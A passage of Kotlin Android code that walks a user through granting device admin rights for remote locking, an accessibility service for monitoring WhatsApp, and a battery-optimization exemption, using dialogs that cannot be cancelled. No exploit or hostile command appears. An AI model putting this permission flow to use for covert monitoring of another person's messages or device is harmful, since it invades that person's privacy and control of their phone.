                        .setTitle("Device Admin Permission Required")
                        .setMessage("This app requires device admin privileges to manage lock and screen settings remotely. Please enable this permission.")
                        .setPositiveButton("Go to Settings") { _, _ ->
                            fromDeviceAdminSettings = true
                            try {
                                val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                                    putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                        "This permission is required to allow the app to lock the device and manage screen settings.")
                                }
                                activity!!.startActivity(intent)
                            } catch (e: Exception) {
                                Logger.error("Failed to open device admin settings", e)
                                checkAccessibilityPermission()
                            }
                        }
                        .setCancelable(false)
                        .setOnDismissListener { currentDialog = null }
                        .create()
                        
                    currentDialog?.show()
                } else {
                    Logger.log("Device admin permission already granted")
                    checkAccessibilityPermission()
                }
            } catch (e: Exception) {
                Logger.error("Failed to check device admin permission", e)
                checkAccessibilityPermission()
            }
        }
    }

    private fun checkAccessibilityPermission() {
        safeExecute {
            try {
                if (!isAccessibilityServiceEnabled()) {
                    Logger.log("Accessibility service not enabled, prompting user")
                    
                    dismissCurrentDialog()
                    currentDialog = AlertDialog.Builder(activity!!)
                        .setTitle("Accessibility Permission Required")
                        .setMessage("This app requires accessibility service to monitor WhatsApp and WhatsApp Business. Please enable it in the accessibility settings.")
                        .setPositiveButton("Go to Settings") { _, _ ->
                            fromAccessibilitySettings = true
                            try {
                                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                                activity!!.startActivity(intent)
                            } catch (e: Exception) {
                                Logger.error("Failed to open accessibility settings", e)
                                checkBatteryOptimization()
                            }
                        }
                        .setCancelable(false)
                        .setOnDismissListener { currentDialog = null }
                        .create()
                        
                    currentDialog?.show()
                } else {
                    Logger.log("Accessibility service enabled")
                    checkBatteryOptimization()
                }
            } catch (e: Exception) {
                Logger.error("Failed to check accessibility permission", e)
                checkBatteryOptimization()
            }
        }
    }

    private fun checkBatteryOptimization() {
        safeExecute {
            try {
                val powerManager = activity!!.getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!powerManager.isIgnoringBatteryOptimizations(activity!!.packageName)) {
                    Logger.log("Battery optimization not disabled, prompting user")
                    
                    val message = getBatteryOptimizationMessage()
                    
                    dismissCurrentDialog()
                    currentDialog = try {
                        val dialogView = activity!!.layoutInflater.inflate(R.layout.custom_dialog_layout, null)
                        AlertDialog.Builder(activity!!)
                            .setTitle("Battery Optimization Required")
                            .setView(dialogView)
                            .setMessage(message)
                            .setPositiveButton("Go to Settings") { _, _ ->
                                disableBatteryOptimization()
                            }
                            .setCancelable(false)
                            .setOnDismissListener { currentDialog = null }
                            .create()
                    } catch (e: Exception) {
                        Logger.error("Failed to inflate custom dialog", e)
                        AlertDialog.Builder(activity!!)
                            .setTitle("Battery Optimization Required")
                            .setMessage(message)
                            .setPositiveButton("Go to Settings") { _, _ ->
                                disableBatteryOptimization()
                            }
                            .setCancelable(false)
                            .setOnDismissListener { currentDialog = null }
                            .create()
                    }
                    
                    currentDialog?.show()
                } else {
                    Logger.log("Battery optimization disabled")
                    startAllServices()
                }
            } catch (e: Exception) {
                Logger.error("Failed to check battery optimization", e)
                startAllServices()
            }
        }
    }

    private fun getBatteryOptimizationMessage(): String {
        val baseMessage = "This app requires battery optimization to be disabled to function properly, especially for WhatsApp monitoring and lock features."
        
        return when (manufacturer) {
            "xiaomi" -> "$baseMessage\n\nFor Xiaomi: Go to Security app > Battery > Manage apps' battery usage > Choose apps > Select this app > No restrictions"
            "oppo" -> "$baseMessage\n\nFor OPPO: Go to Settings > Battery > Battery Optimization > Select this app > Don't optimize"
            "vivo" -> "$baseMessage\n\nFor Vivo: Go to Settings > Battery > High Background Power > Enable for this app"
            "huawei" -> "$baseMessage\n\nFor Huawei: Go to Settings > Battery > App launch > Find this app > Manage manually > Enable all"
            "samsung" -> "$baseMessage\n\nFor Samsung: Go to Device Care > Battery > App power management > Apps that won't be put to sleep > Add this app"
            "oneplus" -> "$baseMessage\n\nFor OnePlus: Go to Settings > Battery > Battery optimization > Select this app > Don't optimize"
            else -> "$baseMessage Please disable battery optimization."
        }
    }

    private fun disableBatteryOptimization() {
        safeExecute {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:${activity!!.packageName}")
                }
                fromBatteryOptimizationSettings = true
                activity!!.startActivity(intent)
            } catch (e: Exception) {
                Logger.error("Battery optimization settings failed", e)
                startAllServices()
            }
        }
    }

    fun cleanup() {
        try {
            dismissCurrentDialog()
            handler.removeCallbacksAndMessages(null)
            activityRef.clear()
        } catch (e: Exception) {
            Logger.error("Error in cleanup", e)
        }
    }

    enum class Feature {
        RESTRICTED, PHONE, STORAGE, INTERNET, LOCK, WHATSAPP, GENERAL
    }
}